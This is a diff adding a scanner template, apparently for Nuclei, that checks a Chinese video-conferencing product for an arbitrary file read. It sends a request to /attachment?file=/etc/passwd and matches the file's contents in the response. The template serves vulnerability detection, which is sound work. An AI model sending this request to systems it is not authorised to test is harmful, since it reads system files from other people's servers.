@@ -1,0 +1,29 @@
+id: santi-attachment-anyfile-read
+info:
+  name: 叁体-佳会视频会议 Attachment 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/attachment?file=/etc/passwd'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "filename=passwd"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
